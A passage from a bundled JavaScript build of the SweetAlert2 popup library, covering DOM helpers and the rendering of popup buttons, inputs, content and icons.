    /**
   * @returns {HTMLButtonElement | null}
   */ const getCancelButton = ()=>/** @type {HTMLButtonElement} */ elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`);
    /**
   * @returns {HTMLButtonElement | null}
   */ const getDenyButton = ()=>/** @type {HTMLButtonElement} */ elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`);
    /**
   * @returns {HTMLElement | null}
   */ const getInputLabel = ()=>elementByClass(swalClasses["input-label"]);
    /**
   * @returns {HTMLElement | null}
   */ const getLoader = ()=>elementBySelector(`.${swalClasses.loader}`);
    /**
   * @returns {HTMLElement | null}
   */ const getActions = ()=>elementByClass(swalClasses.actions);
    /**
   * @returns {HTMLElement | null}
   */ const getFooter = ()=>elementByClass(swalClasses.footer);
    /**
   * @returns {HTMLElement | null}
   */ const getTimerProgressBar = ()=>elementByClass(swalClasses["timer-progress-bar"]);
    /**
   * @returns {HTMLElement | null}
   */ const getCloseButton = ()=>elementByClass(swalClasses.close);
    // https://github.com/jkup/focusable/blob/master/index.js
    const focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
    /**
   * @returns {HTMLElement[]}
   */ const getFocusableElements = ()=>{
        const popup = getPopup();
        if (!popup) return [];
        /** @type {NodeListOf<HTMLElement>} */ const focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
        const focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex)// sort according to tabindex
        .sort((a, b)=>{
            const tabindexA = parseInt(a.getAttribute("tabindex") || "0");
            const tabindexB = parseInt(b.getAttribute("tabindex") || "0");
            if (tabindexA > tabindexB) return 1;
            else if (tabindexA < tabindexB) return -1;
            return 0;
        });
        /** @type {NodeListOf<HTMLElement>} */ const otherFocusableElements = popup.querySelectorAll(focusable);
        const otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter((el)=>el.getAttribute("tabindex") !== "-1");
        return [
            ...new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))
        ].filter((el)=>isVisible$1(el));
    };
    /**
   * @returns {boolean}
   */ const isModal = ()=>{
        return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
    };
    /**
   * @returns {boolean}
   */ const isToast = ()=>{
        const popup = getPopup();
        if (!popup) return false;
        return hasClass(popup, swalClasses.toast);
    };
    /**
   * @returns {boolean}
   */ const isLoading = ()=>{
        const popup = getPopup();
        if (!popup) return false;
        return popup.hasAttribute("data-loading");
    };
    /**
   * Securely set innerHTML of an element
   * https://github.com/sweetalert2/sweetalert2/issues/1926
   *
   * @param {HTMLElement} elem
   * @param {string} html
   */ const setInnerHtml = (elem, html)=>{
        elem.textContent = "";
        if (html) {
            const parser = new DOMParser();
            const parsed = parser.parseFromString(html, `text/html`);
            const head = parsed.querySelector("head");
            if (head) Array.from(head.childNodes).forEach((child)=>{
                elem.appendChild(child);
            });
            const body = parsed.querySelector("body");
            if (body) Array.from(body.childNodes).forEach((child)=>{
                if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) elem.appendChild(child.cloneNode(true)); // https://github.com/sweetalert2/sweetalert2/issues/2507
                else elem.appendChild(child);
            });
        }
    };
    /**
   * @param {HTMLElement} elem
   * @param {string} className
   * @returns {boolean}
   */ const hasClass = (elem, className)=>{
        if (!className) return false;
        const classList = className.split(/\s+/);
        for(let i = 0; i < classList.length; i++){
            if (!elem.classList.contains(classList[i])) return false;
        }
        return true;
    };
    /**
   * @param {HTMLElement} elem
   * @param {SweetAlertOptions} params
   */ const removeCustomClasses = (elem, params)=>{
        Array.from(elem.classList).forEach((className)=>{
            if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) elem.classList.remove(className);
        });
    };
    /**
   * @param {HTMLElement} elem
   * @param {SweetAlertOptions} params
   * @param {string} className
   */ const applyCustomClass = (elem, params, className)=>{
        removeCustomClasses(elem, params);
        if (!params.customClass) return;
        const customClass = params.customClass[/** @type {keyof SweetAlertCustomClass} */ className];
        if (!customClass) return;
        if (typeof customClass !== "string" && !customClass.forEach) {
            warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof customClass}"`);
            return;
        }
        addClass(elem, customClass);
    };
    /**
   * @param {HTMLElement} popup
   * @param {import('./renderers/renderInput').InputClass | SweetAlertInput} inputClass
   * @returns {HTMLInputElement | null}
   */ const getInput$1 = (popup, inputClass)=>{
        if (!inputClass) return null;
        switch(inputClass){
            case "select":
            case "textarea":
            case "file":
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
            case "checkbox":
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
            case "radio":
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
            case "range":
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
            default:
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
        }
    };
    /**
   * @param {HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement} input
   */ const focusInput = (input)=>{
        input.focus();
        // place cursor at end of text in text input
        if (input.type !== "file") {
            // http://stackoverflow.com/a/2345915
            const val = input.value;
            input.value = "";
            input.value = val;
        }
    };
    /**
   * @param {HTMLElement | HTMLElement[] | null} target
   * @param {string | string[] | readonly string[] | undefined} classList
   * @param {boolean} condition
   */ const toggleClass = (target, classList, condition)=>{
        if (!target || !classList) return;
        if (typeof classList === "string") classList = classList.split(/\s+/).filter(Boolean);
        classList.forEach((className)=>{
            if (Array.isArray(target)) target.forEach((elem)=>{
                if (condition) elem.classList.add(className);
                else elem.classList.remove(className);
            });
            else if (condition) target.classList.add(className);
            else target.classList.remove(className);
        });
    };
    /**
   * @param {HTMLElement | HTMLElement[] | null} target
   * @param {string | string[] | readonly string[] | undefined} classList
   */ const addClass = (target, classList)=>{
        toggleClass(target, classList, true);
    };
    /**
   * @param {HTMLElement | HTMLElement[] | null} target
   * @param {string | string[] | readonly string[] | undefined} classList
   */ const removeClass = (target, classList)=>{
        toggleClass(target, classList, false);
    };
    /**
   * Get direct child of an element by class name
   *
   * @param {HTMLElement} elem
   * @param {string} className
   * @returns {HTMLElement | undefined}
   */ const getDirectChildByClass = (elem, className)=>{
        const children = Array.from(elem.children);
        for(let i = 0; i < children.length; i++){
            const child = children[i];
            if (child instanceof HTMLElement && hasClass(child, className)) return child;
        }
    };
    /**
   * @param {HTMLElement} elem
   * @param {string} property
   * @param {*} value
   */ const applyNumericalStyle = (elem, property, value)=>{
        if (value === `${parseInt(value)}`) value = parseInt(value);
        if (value || parseInt(value) === 0) elem.style.setProperty(property, typeof value === "number" ? `${value}px` : value);
        else elem.style.removeProperty(property);
    };
    /**
   * @param {HTMLElement | null} elem
   * @param {string} display
   */ const show = function(elem) {
        let display = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : "flex";
        if (!elem) return;
        elem.style.display = display;
    };
    /**
   * @param {HTMLElement | null} elem
   */ const hide = (elem)=>{
        if (!elem) return;
        elem.style.display = "none";
    };
    /**
   * @param {HTMLElement | null} elem
   * @param {string} display
   */ const showWhenInnerHtmlPresent = function(elem) {
        let display = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : "block";
        if (!elem) return;
        new MutationObserver(()=>{
            toggle(elem, elem.innerHTML, display);
        }).observe(elem, {
            childList: true,
            subtree: true
        });
    };
    /**
   * @param {HTMLElement} parent
   * @param {string} selector
   * @param {string} property
   * @param {string} value
   */ const setStyle = (parent, selector, property, value)=>{
        /** @type {HTMLElement | null} */ const el = parent.querySelector(selector);
        if (el) el.style.setProperty(property, value);
    };
    /**
   * @param {HTMLElement} elem
   * @param {any} condition
   * @param {string} display
   */ const toggle = function(elem, condition) {
        let display = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : "flex";
        if (condition) show(elem, display);
        else hide(elem);
    };
    /**
   * borrowed from jquery $(elem).is(':visible') implementation
   *
   * @param {HTMLElement | null} elem
   * @returns {boolean}
   */ const isVisible$1 = (elem)=>!!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
    /**
   * @returns {boolean}
   */ const allButtonsAreHidden = ()=>!isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
    /**
   * @param {HTMLElement} elem
   * @returns {boolean}
   */ const isScrollable = (elem)=>!!(elem.scrollHeight > elem.clientHeight);
    /**
   * borrowed from https://stackoverflow.com/a/46352119
   *
   * @param {HTMLElement} elem
   * @returns {boolean}
   */ const hasCssAnimation = (elem)=>{
        const style = window.getComputedStyle(elem);
        const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
        const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
        return animDuration > 0 || transDuration > 0;
    };
    /**
   * @param {number} timer
   * @param {boolean} reset
   */ const animateTimerProgressBar = function(timer) {
        let reset = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
        const timerProgressBar = getTimerProgressBar();
        if (!timerProgressBar) return;
        if (isVisible$1(timerProgressBar)) {
            if (reset) {
                timerProgressBar.style.transition = "none";
                timerProgressBar.style.width = "100%";
            }
            setTimeout(()=>{
                timerProgressBar.style.transition = `width ${timer / 1000}s linear`;
                timerProgressBar.style.width = "0%";
            }, 10);
        }
    };
    const stopTimerProgressBar = ()=>{
        const timerProgressBar = getTimerProgressBar();
        if (!timerProgressBar) return;
        const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        timerProgressBar.style.removeProperty("transition");
        timerProgressBar.style.width = "100%";
        const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
        timerProgressBar.style.width = `${timerProgressBarPercent}%`;
    };
    /**
   * Detect Node env
   *
   * @returns {boolean}
   */ const isNodeEnv = ()=>typeof window === "undefined" || typeof document === "undefined";
    const sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
   <button type="button" class="${swalClasses.close}"></button>
   <ul class="${swalClasses["progress-steps"]}"></ul>
   <div class="${swalClasses.icon}"></div>
   <img class="${swalClasses.image}" />
   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
   <input class="${swalClasses.input}" id="${swalClasses.input}" />
   <input type="file" class="${swalClasses.file}" />
   <div class="${swalClasses.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${swalClasses.select}" id="${swalClasses.select}"></select>
   <div class="${swalClasses.radio}"></div>
   <label class="${swalClasses.checkbox}">
     <input type="checkbox" id="${swalClasses.checkbox}" />
     <span class="${swalClasses.label}"></span>
   </label>
   <textarea class="${swalClasses.textarea}" id="${swalClasses.textarea}"></textarea>
   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   <div class="${swalClasses.actions}">
     <div class="${swalClasses.loader}"></div>
     <button type="button" class="${swalClasses.confirm}"></button>
     <button type="button" class="${swalClasses.deny}"></button>
     <button type="button" class="${swalClasses.cancel}"></button>
   </div>
   <div class="${swalClasses.footer}"></div>
   <div class="${swalClasses["timer-progress-bar-container"]}">
     <div class="${swalClasses["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
    /**
   * @returns {boolean}
   */ const resetOldContainer = ()=>{
        const oldContainer = getContainer();
        if (!oldContainer) return false;
        oldContainer.remove();
        removeClass([
            document.documentElement,
            document.body
        ], [
            swalClasses["no-backdrop"],
            swalClasses["toast-shown"],
            swalClasses["has-column"]
        ]);
        return true;
    };
    const resetValidationMessage$1 = ()=>{
        globalState.currentInstance.resetValidationMessage();
    };
    const addInputChangeListeners = ()=>{
        const popup = getPopup();
        const input = getDirectChildByClass(popup, swalClasses.input);
        const file = getDirectChildByClass(popup, swalClasses.file);
        /** @type {HTMLInputElement} */ const range = popup.querySelector(`.${swalClasses.range} input`);
        /** @type {HTMLOutputElement} */ const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
        const select = getDirectChildByClass(popup, swalClasses.select);
        /** @type {HTMLInputElement} */ const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
        const textarea = getDirectChildByClass(popup, swalClasses.textarea);
        input.oninput = resetValidationMessage$1;
        file.onchange = resetValidationMessage$1;
        select.onchange = resetValidationMessage$1;
        checkbox.onchange = resetValidationMessage$1;
        textarea.oninput = resetValidationMessage$1;
        range.oninput = ()=>{
            resetValidationMessage$1();
            rangeOutput.value = range.value;
        };
        range.onchange = ()=>{
            resetValidationMessage$1();
            rangeOutput.value = range.value;
        };
    };
    /**
   * @param {string | HTMLElement} target
   * @returns {HTMLElement}
   */ const getTarget = (target)=>typeof target === "string" ? document.querySelector(target) : target;
    /**
   * @param {SweetAlertOptions} params
   */ const setupAccessibility = (params)=>{
        const popup = getPopup();
        popup.setAttribute("role", params.toast ? "alert" : "dialog");
        popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
        if (!params.toast) popup.setAttribute("aria-modal", "true");
    };
    /**
   * @param {HTMLElement} targetElement
   */ const setupRTL = (targetElement)=>{
        if (window.getComputedStyle(targetElement).direction === "rtl") addClass(getContainer(), swalClasses.rtl);
    };
    /**
   * Add modal + backdrop + no-war message for Russians to DOM
   *
   * @param {SweetAlertOptions} params
   */ const init = (params)=>{
        // Clean up the old popup container if it exists
        const oldContainerExisted = resetOldContainer();
        if (isNodeEnv()) {
            error("SweetAlert2 requires document to initialize");
            return;
        }
        const container = document.createElement("div");
        container.className = swalClasses.container;
        if (oldContainerExisted) addClass(container, swalClasses["no-transition"]);
        setInnerHtml(container, sweetHTML);
        const targetElement = getTarget(params.target);
        targetElement.appendChild(container);
        setupAccessibility(params);
        setupRTL(targetElement);
        addInputChangeListeners();
    };
    /**
   * @param {HTMLElement | object | string} param
   * @param {HTMLElement} target
   */ const parseHtmlToContainer = (param, target)=>{
        // DOM element
        if (param instanceof HTMLElement) target.appendChild(param);
        else if (typeof param === "object") handleObject(param, target);
        else if (param) setInnerHtml(target, param);
    };
    /**
   * @param {any} param
   * @param {HTMLElement} target
   */ const handleObject = (param, target)=>{
        // JQuery element(s)
        if (param.jquery) handleJqueryElem(target, param);
        else setInnerHtml(target, param.toString());
    };
    /**
   * @param {HTMLElement} target
   * @param {any} elem
   */ const handleJqueryElem = (target, elem)=>{
        target.textContent = "";
        if (0 in elem) for(let i = 0; (i in elem); i++)target.appendChild(elem[i].cloneNode(true));
        else target.appendChild(elem.cloneNode(true));
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderActions = (instance, params)=>{
        const actions = getActions();
        const loader = getLoader();
        if (!actions || !loader) return;
        // Actions (buttons) wrapper
        if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) hide(actions);
        else show(actions);
        // Custom class
        applyCustomClass(actions, params, "actions");
        // Render all the buttons
        renderButtons(actions, loader, params);
        // Loader
        setInnerHtml(loader, params.loaderHtml || "");
        applyCustomClass(loader, params, "loader");
    };
    /**
   * @param {HTMLElement} actions
   * @param {HTMLElement} loader
   * @param {SweetAlertOptions} params
   */ function renderButtons(actions, loader, params) {
        const confirmButton = getConfirmButton();
        const denyButton = getDenyButton();
        const cancelButton = getCancelButton();
        if (!confirmButton || !denyButton || !cancelButton) return;
        // Render buttons
        renderButton(confirmButton, "confirm", params);
        renderButton(denyButton, "deny", params);
        renderButton(cancelButton, "cancel", params);
        handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
        if (params.reverseButtons) {
            if (params.toast) {
                actions.insertBefore(cancelButton, confirmButton);
                actions.insertBefore(denyButton, confirmButton);
            } else {
                actions.insertBefore(cancelButton, loader);
                actions.insertBefore(denyButton, loader);
                actions.insertBefore(confirmButton, loader);
            }
        }
    }
    /**
   * @param {HTMLElement} confirmButton
   * @param {HTMLElement} denyButton
   * @param {HTMLElement} cancelButton
   * @param {SweetAlertOptions} params
   */ function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
        if (!params.buttonsStyling) {
            removeClass([
                confirmButton,
                denyButton,
                cancelButton
            ], swalClasses.styled);
            return;
        }
        addClass([
            confirmButton,
            denyButton,
            cancelButton
        ], swalClasses.styled);
        // Buttons background colors
        if (params.confirmButtonColor) {
            confirmButton.style.backgroundColor = params.confirmButtonColor;
            addClass(confirmButton, swalClasses["default-outline"]);
        }
        if (params.denyButtonColor) {
            denyButton.style.backgroundColor = params.denyButtonColor;
            addClass(denyButton, swalClasses["default-outline"]);
        }
        if (params.cancelButtonColor) {
            cancelButton.style.backgroundColor = params.cancelButtonColor;
            addClass(cancelButton, swalClasses["default-outline"]);
        }
    }
    /**
   * @param {HTMLElement} button
   * @param {'confirm' | 'deny' | 'cancel'} buttonType
   * @param {SweetAlertOptions} params
   */ function renderButton(button, buttonType, params) {
        const buttonName = /** @type {'Confirm' | 'Deny' | 'Cancel'} */ capitalizeFirstLetter(buttonType);
        toggle(button, params[`show${buttonName}Button`], "inline-block");
        setInnerHtml(button, params[`${buttonType}ButtonText`] || ""); // Set caption text
        button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`] || ""); // ARIA label
        // Add buttons custom classes
        button.className = swalClasses[buttonType];
        applyCustomClass(button, params, `${buttonType}Button`);
    }
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderCloseButton = (instance, params)=>{
        const closeButton = getCloseButton();
        if (!closeButton) return;
        setInnerHtml(closeButton, params.closeButtonHtml || "");
        // Custom class
        applyCustomClass(closeButton, params, "closeButton");
        toggle(closeButton, params.showCloseButton);
        closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderContainer = (instance, params)=>{
        const container = getContainer();
        if (!container) return;
        handleBackdropParam(container, params.backdrop);
        handlePositionParam(container, params.position);
        handleGrowParam(container, params.grow);
        // Custom class
        applyCustomClass(container, params, "container");
    };
    /**
   * @param {HTMLElement} container
   * @param {SweetAlertOptions['backdrop']} backdrop
   */ function handleBackdropParam(container, backdrop) {
        if (typeof backdrop === "string") container.style.background = backdrop;
        else if (!backdrop) addClass([
            document.documentElement,
            document.body
        ], swalClasses["no-backdrop"]);
    }
    /**
   * @param {HTMLElement} container
   * @param {SweetAlertOptions['position']} position
   */ function handlePositionParam(container, position) {
        if (!position) return;
        if (position in swalClasses) addClass(container, swalClasses[position]);
        else {
            warn('The "position" parameter is not valid, defaulting to "center"');
            addClass(container, swalClasses.center);
        }
    }
    /**
   * @param {HTMLElement} container
   * @param {SweetAlertOptions['grow']} grow
   */ function handleGrowParam(container, grow) {
        if (!grow) return;
        addClass(container, swalClasses[`grow-${grow}`]);
    }
    /**
   * This module contains `WeakMap`s for each effectively-"private  property" that a `Swal` has.
   * For example, to set the private property "foo" of `this` to "bar", you can `privateProps.foo.set(this, 'bar')`
   * This is the approach that Babel will probably take to implement private methods/fields
   *   https://github.com/tc39/proposal-private-methods
   *   https://github.com/babel/babel/pull/7555
   * Once we have the changes from that PR in Babel, and our core class fits reasonable in *one module*
   *   then we can use that language feature.
   */ var privateProps = {
        innerParams: new WeakMap(),
        domCache: new WeakMap()
    };
    /// <reference path="../../../../sweetalert2.d.ts"/>
    /** @type {InputClass[]} */ const inputClasses = [
        "input",
        "file",
        "range",
        "select",
        "radio",
        "checkbox",
        "textarea"
    ];
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderInput = (instance, params)=>{
        const popup = getPopup();
        if (!popup) return;
        const innerParams = privateProps.innerParams.get(instance);
        const rerender = !innerParams || params.input !== innerParams.input;
        inputClasses.forEach((inputClass)=>{
            const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
            if (!inputContainer) return;
            // set attributes
            setAttributes(inputClass, params.inputAttributes);
            // set class
            inputContainer.className = swalClasses[inputClass];
            if (rerender) hide(inputContainer);
        });
        if (params.input) {
            if (rerender) showInput(params);
            // set custom class
            setCustomClass(params);
        }
    };
    /**
   * @param {SweetAlertOptions} params
   */ const showInput = (params)=>{
        if (!params.input) return;
        if (!renderInputType[params.input]) {
            error(`Unexpected type of input! Expected ${Object.keys(renderInputType).join(" | ")}, got "${params.input}"`);
            return;
        }
        const inputContainer = getInputContainer(params.input);
        if (!inputContainer) return;
        const input = renderInputType[params.input](inputContainer, params);
        show(inputContainer);
        // input autofocus
        if (params.inputAutoFocus) setTimeout(()=>{
            focusInput(input);
        });
    };
    /**
   * @param {HTMLInputElement} input
   */ const removeAttributes = (input)=>{
        for(let i = 0; i < input.attributes.length; i++){
            const attrName = input.attributes[i].name;
            if (![
                "id",
                "type",
                "value",
                "style"
            ].includes(attrName)) input.removeAttribute(attrName);
        }
    };
    /**
   * @param {InputClass} inputClass
   * @param {SweetAlertOptions['inputAttributes']} inputAttributes
   */ const setAttributes = (inputClass, inputAttributes)=>{
        const popup = getPopup();
        if (!popup) return;
        const input = getInput$1(popup, inputClass);
        if (!input) return;
        removeAttributes(input);
        for(const attr in inputAttributes)input.setAttribute(attr, inputAttributes[attr]);
    };
    /**
   * @param {SweetAlertOptions} params
   */ const setCustomClass = (params)=>{
        if (!params.input) return;
        const inputContainer = getInputContainer(params.input);
        if (inputContainer) applyCustomClass(inputContainer, params, "input");
    };
    /**
   * @param {HTMLInputElement | HTMLTextAreaElement} input
   * @param {SweetAlertOptions} params
   */ const setInputPlaceholder = (input, params)=>{
        if (!input.placeholder && params.inputPlaceholder) input.placeholder = params.inputPlaceholder;
    };
    /**
   * @param {Input} input
   * @param {Input} prependTo
   * @param {SweetAlertOptions} params
   */ const setInputLabel = (input, prependTo, params)=>{
        if (params.inputLabel) {
            const label = document.createElement("label");
            const labelClass = swalClasses["input-label"];
            label.setAttribute("for", input.id);
            label.className = labelClass;
            if (typeof params.customClass === "object") addClass(label, params.customClass.inputLabel);
            label.innerText = params.inputLabel;
            prependTo.insertAdjacentElement("beforebegin", label);
        }
    };
    /**
   * @param {SweetAlertInput} inputType
   * @returns {HTMLElement | undefined}
   */ const getInputContainer = (inputType)=>{
        const popup = getPopup();
        if (!popup) return;
        return getDirectChildByClass(popup, swalClasses[/** @type {SwalClass} */ inputType] || swalClasses.input);
    };
    /**
   * @param {HTMLInputElement | HTMLOutputElement | HTMLTextAreaElement} input
   * @param {SweetAlertOptions['inputValue']} inputValue
   */ const checkAndSetInputValue = (input, inputValue)=>{
        if ([
            "string",
            "number"
        ].includes(typeof inputValue)) input.value = `${inputValue}`;
        else if (!isPromise(inputValue)) warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
    };
    /** @type {Record<SweetAlertInput, (input: Input | HTMLElement, params: SweetAlertOptions) => Input>} */ const renderInputType = {};
    /**
   * @param {HTMLInputElement} input
   * @param {SweetAlertOptions} params
   * @returns {HTMLInputElement}
   */ renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = /** @type {(input: Input | HTMLElement, params: SweetAlertOptions) => Input} */ (input, params)=>{
        checkAndSetInputValue(input, params.inputValue);
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        input.type = params.input;
        return input;
    };
    /**
   * @param {HTMLInputElement} input
   * @param {SweetAlertOptions} params
   * @returns {HTMLInputElement}
   */ renderInputType.file = (input, params)=>{
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        return input;
    };
    /**
   * @param {HTMLInputElement} range
   * @param {SweetAlertOptions} params
   * @returns {HTMLInputElement}
   */ renderInputType.range = (range, params)=>{
        const rangeInput = range.querySelector("input");
        const rangeOutput = range.querySelector("output");
        checkAndSetInputValue(rangeInput, params.inputValue);
        rangeInput.type = params.input;
        checkAndSetInputValue(rangeOutput, params.inputValue);
        setInputLabel(rangeInput, range, params);
        return range;
    };
    /**
   * @param {HTMLSelectElement} select
   * @param {SweetAlertOptions} params
   * @returns {HTMLSelectElement}
   */ renderInputType.select = (select, params)=>{
        select.textContent = "";
        if (params.inputPlaceholder) {
            const placeholder = document.createElement("option");
            setInnerHtml(placeholder, params.inputPlaceholder);
            placeholder.value = "";
            placeholder.disabled = true;
            placeholder.selected = true;
            select.appendChild(placeholder);
        }
        setInputLabel(select, select, params);
        return select;
    };
    /**
   * @param {HTMLInputElement} radio
   * @returns {HTMLInputElement}
   */ renderInputType.radio = (radio)=>{
        radio.textContent = "";
        return radio;
    };
    /**
   * @param {HTMLLabelElement} checkboxContainer
   * @param {SweetAlertOptions} params
   * @returns {HTMLInputElement}
   */ renderInputType.checkbox = (checkboxContainer, params)=>{
        const checkbox = getInput$1(getPopup(), "checkbox");
        checkbox.value = "1";
        checkbox.checked = Boolean(params.inputValue);
        const label = checkboxContainer.querySelector("span");
        setInnerHtml(label, params.inputPlaceholder || params.inputLabel);
        return checkbox;
    };
    /**
   * @param {HTMLTextAreaElement} textarea
   * @param {SweetAlertOptions} params
   * @returns {HTMLTextAreaElement}
   */ renderInputType.textarea = (textarea, params)=>{
        checkAndSetInputValue(textarea, params.inputValue);
        setInputPlaceholder(textarea, params);
        setInputLabel(textarea, textarea, params);
        /**
     * @param {HTMLElement} el
     * @returns {number}
     */ const getMargin = (el)=>parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
        // https://github.com/sweetalert2/sweetalert2/issues/2291
        setTimeout(()=>{
            // https://github.com/sweetalert2/sweetalert2/issues/1699
            if ("MutationObserver" in window) {
                const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
                const textareaResizeHandler = ()=>{
                    // check if texarea is still in document (i.e. popup wasn't closed in the meantime)
                    if (!document.body.contains(textarea)) return;
                    const textareaWidth = textarea.offsetWidth + getMargin(textarea);
                    if (textareaWidth > initialPopupWidth) getPopup().style.width = `${textareaWidth}px`;
                    else applyNumericalStyle(getPopup(), "width", params.width);
                };
                new MutationObserver(textareaResizeHandler).observe(textarea, {
                    attributes: true,
                    attributeFilter: [
                        "style"
                    ]
                });
            }
        });
        return textarea;
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderContent = (instance, params)=>{
        const htmlContainer = getHtmlContainer();
        if (!htmlContainer) return;
        showWhenInnerHtmlPresent(htmlContainer);
        applyCustomClass(htmlContainer, params, "htmlContainer");
        // Content as HTML
        if (params.html) {
            parseHtmlToContainer(params.html, htmlContainer);
            show(htmlContainer, "block");
        } else if (params.text) {
            htmlContainer.textContent = params.text;
            show(htmlContainer, "block");
        } else hide(htmlContainer);
        renderInput(instance, params);
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderFooter = (instance, params)=>{
        const footer = getFooter();
        if (!footer) return;
        showWhenInnerHtmlPresent(footer);
        toggle(footer, params.footer, "block");
        if (params.footer) parseHtmlToContainer(params.footer, footer);
        // Custom class
        applyCustomClass(footer, params, "footer");
    };
    /**
   * @param {SweetAlert} instance
   * @param {SweetAlertOptions} params
   */ const renderIcon = (instance, params)=>{
        const innerParams = privateProps.innerParams.get(instance);
        const icon = getIcon();
        if (!icon) return;
        // if the given icon already rendered, apply the styling without re-rendering the icon
        if (innerParams && params.icon === innerParams.icon) {
            // Custom or default content
            setContent(icon, params);
            applyStyles(icon, params);
            return;
        }
        if (!params.icon && !params.iconHtml) {
            hide(icon);
            return;
        }
        if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
            error(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
            hide(icon);
            return;
        }
        show(icon);
        // Custom or default content
        setContent(icon, params);
        applyStyles(icon, params);
        // Animate icon
        addClass(icon, params.showClass && params.showClass.icon);
    };
    /**
   * @param {HTMLElement} icon
   * @param {SweetAlertOptions} params
   */ const applyStyles = (icon, params)=>{
        for (const [iconType, iconClassName] of Object.entries(iconTypes))if (params.icon !== iconType) removeClass(icon, iconClassName);
        addClass(icon, params.icon && iconTypes[params.icon]);
        // Icon color
        setColor(icon, params);
        // Success icon background color
        adjustSuccessIconBackgroundColor();
        // Custom class
        applyCustomClass(icon, params, "icon");
    };
    // Adjust success icon background color to match the popup background color
    const adjustSuccessIconBackgroundColor = ()=>{
        const popup = getPopup();
        if (!popup) return;
        const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
        /** @type {NodeListOf<HTMLElement>} */ const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
        for(let i = 0; i < successIconParts.length; i++)successIconParts[i].style.backgroundColor = popupBackgroundColor;
    };
    const successIconHtml = `
  <div class="swal2-success-circular-line-left"></div>
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
  <div class="swal2-success-circular-line-right"></div>
`;
    const errorIconHtml = `
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`;
    /**
   * @param {HTMLElement} icon
   * @param {SweetAlertOptions} params
   */ const setContent = (icon, params)=>{
        if (!params.icon && !params.iconHtml) return;
        let oldContent = icon.innerHTML;
        let newContent = "";
